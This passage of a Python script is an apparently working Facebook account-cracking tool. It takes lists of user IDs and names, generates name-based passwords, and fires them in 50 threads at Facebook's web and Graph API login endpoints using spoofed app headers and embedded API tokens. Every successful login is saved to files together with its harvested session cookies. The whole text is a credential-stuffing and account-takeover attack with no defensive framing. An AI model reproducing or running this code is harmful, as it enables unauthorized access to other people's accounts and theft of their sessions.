                    'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                    'email': uid,
                    'pass': pas,
                    'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), pas),
                    'login_source': 'comet_headerless_login',
                    'next': '',
                    'try_number': '0',
                    'unrecognized_tries': '0',
                    'prefill_source': 'browser_dropdown',
                    'prefill_type': 'contact_point',
                    'first_prefill_source': 'browser_dropdown',
                    'first_prefill_type': 'contact_point',
                    'had_cp_prefilled': 'true',
                    'had_password_prefilled': 'false',
                    'is_smart_lock': 'false',
                    '__dyn': '',
                    '__csr': '',
                    '__req': '',
                    '__a': '',
                    '__user': '0'
                    }
            update = {
                'User-Agent': random.choice(['[FBAN/FB4A;FBAV/62.0.0.4069;FBBV/4158042[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476335;FBDM/{density=2.0,width=720,height=1358};FBLC/en_US;FBCR/null;FBMF/Pixel;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Pixel 7a;FBSV/13;nullFBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/195.0.0.35.99;FBBV/128710107;FBDM/{density=1.75,width=720,height=1396};FBLC/en_US;FBCR/axis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/LT-C3750;FBSV/6;nullFBCA/arm64-v8a:;]']),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Referer': 'https://www.facebook.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.facebook.com',
                'Alt-Used': 'www.facebook.com',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'x-requested-with': 'XMLHttpRequest',
                'x-response-format': 'JSONStream',
            }
            session.post(url=f"https://www.facebook.com/login/", data=info, headers=update).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs', coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if "Y" in ckk:
                        print(f'\r\r' + bgr + '[MAGI-OK] ' + cid + ' | ' + pas)
                        print(bgr + '[BISCUITS] ' + cy + coki)
                        open('/sdcard/MAGI-RANDOM-OK.txt', 'a').write(cid + '|' + pas + '\n')
                        open('/sdcard/MAGI-RANDOM-COOKIES-OK.txt', 'a').write(cid + '|' + pas + '|' + coki + '\n')
                        oks.append(uid)
                        break
                    else:
                        print(f'\r\r' + bgr + '[MAGI-OK] ' + cid + ' | ' + pas)
                        open('/sdcard/MAGI-RANDOM-OK.txt', 'a').write(cid + '|' + pas + '\n')
                        oks.append(uid)
                        break

            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

#=========MAHADI============#

def file():
    os.system('clear')
    print(simple)

    file_input = input(cc + "[-] Enter File: ")
    try:
        file_content = open(file_input, "r").read().splitlines()
        os.system('clear')
        print(simple)

        p_limit = int(input(cc + '[+] How Many Passwords You Want To Input: ' + red))
        print(cy + '─────────────────────────────────────────────' + reset)

        passwords = []  # Initialize an empty list for passwords

        for cuda in range(p_limit):
            file_pass = input(f"{B}[{cuda + 1}] {cc}password: {reset}")
            passwords.append(file_pass)

        os.system('clear')
        print(simple)
        print(cc + '[1] Method ')
        print(cc + '[2] Method ')
        print(cy + '─────────────────────────────────────────────' + reset)
        methodin = input('[+] Choose: ')
        os.system('clear')
        print(simple)
        with ThreadPool(max_workers=50) as MAGI:
            count = str(len(file_content))
            os.system('clear')
            print(simple)
            print(cc + '[' + red + '~' + cc + '] Total Accounts : ' + bgr + count)
            print(cc + '[' + red + '~' + cc + '] Airplane For Faster Speed')
            print(cy + '─────────────────────────────────────────────' + reset)
            for sunnyleone in file_content:
                ids, names = sunnyleone.split('|')
                passlist = passwords.copy()  # Use a copy of the passwords list for each user

                if methodin == '1':
                    MAGI.submit(film1, ids, names, passlist)
                elif methodin == '2':
                    MAGI.submit(film2, ids, names, passlist)

    except FileNotFoundError:
        print(blu + 'INPUT THE RIGHT PATH PLEASE!' + blu)
        print(cy + '─────────────────────────────────────────────' + reset)
        time.sleep(0.9)
        return file()


def film1(ids, names, passlist):
    global loop, oks, cps
    noti = random.choice(['\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m'])
    sys.stdout.write(f'\r{cc}[<{noti}SAYEM{cc}>] <%s> × <{red}%s{cc}> × <{bgr}%s{cc}>' % (loop, len(cps), len(oks)))
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
            data = {
                "email": ids,
                "password": pas,
                "adid": str(uuid.uuid4()),
                "device_id": str(uuid.uuid4()),
                "family_device_id": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "locale": "en_US",
                "client_country_code": "US",
                "cpl": "true",
                "source": "login",
                "format": "json",
                "omit_response_on_success": "false",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
                "tier": "regular",
                "currently_logged_in_userid": "0",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
                "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
                "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "1d6bdac1d94b7eff5dfc99453b632a28"
            }
            head = {
                "User-Agent": "[FBAN/MessengerLite;FBAV/405.0.0.29.104;FBBV/14299506;FBDM/{density=2.0,width=1080,height=1080};FBLC/en_US;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-J500G;FBSV/4.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Connection-Quality": "EXCELLENT",
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-FB-connection-Token": "d29d67d37eca387482a8a5b740f84f62",
                "X-FB-HTTP-Engine": "Liger",
                'X-FB-Client-IP': 'True',
                "X-FB-Friendly-Name": "authenticate",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url, data=data, headers=head, allow_redirects=False, verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                print(f'\r\r' + bgr + '[MAGI-OK] ' + ids + ' | ' + pas)
                print(bgr + '[BISCUITS] ' + cy + coki)
                open('/sdcard/MAGI-FILE-OK.txt', 'a').write(ids + '|' + pas + '\n')
                open('/sdcard/MAGI-FILE-COOKIES-OK.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r' + red + '[MAGI-CP] ' + ids + ' | ' + pas)
                open('/sdcard/MAGI-FILE-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
            else:
                continue
                #print(ids + '|' + pas + '\n')
        loop += 1
    except Exception as e:
        pass
        
    
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"  
def film2(ids, names, passlist):
    global loop, oks, cps
    noti = random.choice(['\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m'])
    sys.stdout.write(f'\r{cc}[<{noti}SAYEM{cc}>] <%s> × <{red}%s{cc}> × <{bgr}%s{cc}>' % (loop, len(cps), len(oks)))
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            headers = {
                'User-Agent': '[FBAN/FB4A;FBAV/172.0.0.70.12;FBPN/com.facebook.katana;FBLC/en_US;FBBV/226829039;FBCR/Maxis;FBMF/OPPO;FBBD/OPPO;FBDV/A95;FBSV/14.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.875,width=720,height=1467};FB_FW/1;]',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': f'{SEX}',
                'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                'X-FB-Connection-Quty': f'{SEX}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            ses=requests.Session()
            q = ses.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False,
                         verify=True).json()
            if "session_key" in q:
                coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                print(f'\r\r' + bgr + '[MAGI-OK] ' + uid + ' | ' + pas)
                print(bgr + '[BISCUITS] ' + cy + coki)
                open('/sdcard/MAGI-FILE-OK.txt', 'a').write(uid + '|' + pas + '\n')
                open('/sdcard/MAGI-FILE-COOKIES-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in q['error']['message']:
                open('/sdcard/MAGI-FILE-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass

    
menu()